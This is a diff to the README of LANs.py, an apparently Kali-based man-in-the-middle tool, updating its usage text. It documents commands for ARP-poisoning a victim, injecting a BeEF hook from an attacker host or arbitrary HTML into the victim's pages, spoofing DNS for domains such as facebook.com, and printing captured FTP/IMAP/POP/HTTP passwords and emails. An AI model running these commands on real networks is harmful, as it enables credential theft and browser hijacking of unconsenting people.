@@ -12,6 +12,12 @@ Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking 
 
 
 
+Complete Usage:
+
+usage: LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
+               [-d] [-v] [-dns DNSSPOOF] [-set] [-p] [-na] [-n] [-i INTERFACE]
+               [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
+
 Simplest usage:
 
 ```
@@ -43,7 +49,7 @@ HTML injection:
 python LANs.py -b http://192.168.0.5:3000/hook.js
 ```
 
-Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits.   
+Injecting BeEF hook URL into pages the victim visits.   
 
 
 ```
@@ -52,6 +58,7 @@ python LANs.py -c '<title>Owned.</title>'
 
 Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` and failing that injects prior to the first `</head>`. This example will change the page title to 'Owned.'
 
+More info about BEeF Project: (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/)
 
 Read from pcap:
 
@@ -73,31 +80,61 @@ All options:
 python LANs.py -h
 ```
 
--b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
+usage: LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
+               [-d] [-v] [-dns DNSSPOOF] [-set] [-p] [-na] [-n] [-i INTERFACE]
+               [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]
 
--c 'HTML CODE': inject arbitrary html code into pages the victim vists; include the quotes when selecting HTML to inject
-
--d: open an xterm with driftnet to see all images they view
-
--dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
-
--u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
-
--i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
-
--ip: target this IP address 
-
--n: performs a quick nmap scan of the target
-
--na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
-
--p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
-
--pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
-
--v: show verbose URLs which do not truncate at 150 characters like -u
-
-
+optional arguments:
+  -h, --help            show this help message and exit
+  -b BEEF, --beef BEEF  Inject a BeEF hook URL. Example usage: -b
+                        http://192.168.0.3:3000/hook.js
+  -c CODE, --code CODE  Inject arbitrary html. Example usage (include quotes):
+                        -c '<title>New title</title>'
+  -u, --urlspy          Show all URLs and search terms the victim visits or
+                        enters minus URLs that end in .jpg, .png, .gif, .css,
+                        and .js to make the output much friendlier. Also
+                        truncates URLs at 150 characters. Use -v to print all
+                        URLs and without truncation.
+  -ip IPADDRESS, --ipaddress IPADDRESS
+                        Enter IP address of victim and skip the arp ping at
+                        the beginning which would give you a list of possible
+                        targets. Usage: -ip <victim IP>
+  -vmac VICTIMMAC, --victimmac VICTIMMAC
+                        Set the victim MAC; by default the script will attempt
+                        a few different ways of getting this so this option
+                        hopefully won't be necessary
+  -d, --driftnet        Open an xterm window with driftnet.
+  -v, --verboseURL      Shows all URLs the victim visits but doesn't limit the
+                        URL to 150 characters like -u does.
+  -dns DNSSPOOF, --dnsspoof DNSSPOOF
+                        Spoof DNS responses of a specific domain. Enter domain
+                        after this argument. An argument like [facebook.com]
+                        will match all subdomains of facebook.com
+  -set, --setoolkit     Start Social Engineer's Toolkit in another window.
+  -p, --post            Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP
+                        usernames/passwords and incoming/outgoing emails. Will
+                        also decode base64 encrypted POP/IMAP
+                        username/password combos for you.
+  -na, --nmapaggressive
+                        Aggressively scan the target for open ports and
+                        services in the background. Output to
+                        ip.add.re.ss.log.txt where ip.add.re.ss is the
+                        victim's IP.
+  -n, --nmap            Scan the target for open ports prior to starting to
+                        sniffing their packets.
+  -i INTERFACE, --interface INTERFACE
+                        Choose the interface to use. Default is the first one
+                        that shows up in `ip route`.
+  -rip ROUTERIP, --routerip ROUTERIP
+                        Set the router IP; by default the script with attempt
+                        a few different ways of getting this so this option
+                        hopefully won't be necessary
+  -rmac ROUTERMAC, --routermac ROUTERMAC
+                        Set the router MAC; by default the script with attempt
+                        a few different ways of getting this so this option
+                        hopefully won't be necessary
+  -pcap PCAP, --pcap PCAP
+                        Parse through a pcap file
 
 
 Cleans the following on Ctrl-C:
@@ -105,6 +142,8 @@ Cleans the following on Ctrl-C:
 --Turn off IP forwarding
 
 --Flush iptables firewall
+
+--Disables monitoring mode
 
 --Individually restore each machine's ARP table
 
